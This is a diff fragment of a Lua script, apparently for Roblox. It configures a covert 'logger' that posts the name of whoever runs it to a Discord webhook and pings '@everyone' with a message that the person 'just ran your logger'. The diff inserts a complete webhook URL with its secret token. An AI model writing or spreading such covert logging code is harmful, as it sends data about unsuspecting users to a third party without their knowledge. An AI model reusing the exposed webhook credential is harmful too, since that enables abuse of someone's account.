@@ -10,11 +10,9 @@ local webhookcheck =
    "Kid with shit exploit"
 
 local url =
-   "webhook goes here" --pretty obvious what to do here
+   "https://discord.com/api/webhooks/1274498083215900703/4wQ6d44dwSLBLJ9YVIRORVq4TKdVZPdLYWry9SI90TtkvhqwdUdqIfK_CalHofizKZPh" --pretty obvious what to do here
 local data = {
-            ["username"] = "Salmon-L0G", --webhook name thing idk
-            ["avatar_url"] = "https://cdn.upload.systems/uploads/haO2MM1R.png", --avatar image url
-    
+   
     ["content"] = " @everyone **" ..game.Players.LocalPlayer.Name.. "** just ran your logger", --normal message
     ["embeds"] = {
        {
